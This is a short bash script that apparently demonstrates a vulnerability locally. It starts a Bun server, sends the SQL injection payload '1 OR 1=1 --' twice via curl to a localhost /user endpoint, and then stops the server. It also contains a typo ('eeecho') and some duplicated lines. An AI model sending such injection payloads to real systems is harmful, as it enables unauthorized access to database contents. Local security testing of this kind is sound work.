

#!/bin/bash


# Start the Express server using Bun (with watch mode)

echo "Starting the server with 'bun --watch index.ts'..."
bun --watch index.ts &  # Start server in the background


eeecho "waiting for the server to start -->"
# adjust the sleep time (5 seconds for now :) for the server to start
sleep 5


URL="http://localhost:3000/user"
# Simulate SQL Injection using `1 OR 1=1 --`
echo "Simulating SQL Injection..."

# Crafting the SQL Injection payload
INJECTION_PAYLOAD="1%20OR%201=1%20--"

# Sending the attack request via curl to the vulnerable endpoint
curl -v "$URL/$INJECTION_PAYLOAD"


echo "Simulating multiple SQL injection attempts..."
# Another SQL Injection payload example
INJECTION_PAYLOAD="1%20OR%201=1%20--"
curl -v "$URL/$INJECTION_PAYLOAD"

# You can repeat this for other types of injection payloads as well, or try to cause issues with additional parameters.
echo "SQL Injection simulation complete."


echo "SQL Injection simulation complete."

# Optionally, you can stop the server after the test by killing the background process
kill %1  # Kill the background Bun server process
echo "Server stopped."
